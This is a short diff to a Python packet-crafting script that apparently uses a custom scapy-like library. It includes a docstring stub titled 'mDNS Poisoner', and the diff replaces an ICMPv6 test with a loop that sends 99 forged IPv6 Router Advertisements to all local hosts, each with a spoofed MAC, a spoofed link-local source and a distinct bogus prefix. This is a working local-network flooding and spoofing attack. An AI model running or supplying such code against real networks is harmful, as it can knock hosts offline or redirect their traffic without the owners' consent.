@@ -1,5 +1,5 @@
 from All import *
-from Icmpv6 import ICMPv6DstUnreach
+from Ndp import NDPRouterAdv
 """
 mDNS Poisoner:
 def ismatch_mdns(pkt: Ether):
@@ -22,10 +22,11 @@ def onmatch_mdns(pkt: Ether):
 
 sniff(ismatch_mdns, onmatch_mdns)
 """
-# pkt = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff")/IPv6(psrc="::1", pdst="::1")/UDP(dport=5353)/DNS(qd=DNSQR(qname="oripc.local"))
-# send(pkt)
-# print(pkt.__bytes__())
 
-pkt = Ether()/IPv6(pdst="::1")/ICMPv6DstUnreach(code=1)/"asd"
-print(pkt)
-sendreceive(pkt)
+for i in range(1, 100):
+    i = str(i).zfill(2)
+    mac = f"de:ad:00:00:00:{i}"
+    psrc = f"fe80::{i}"
+    pref = f"2a01:0:0:0{i}::"
+    pkt = Ether(src=mac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst="ff02::1", hoplimit=255)/NDPRouterAdv(mac, pref)
+    send(pkt)
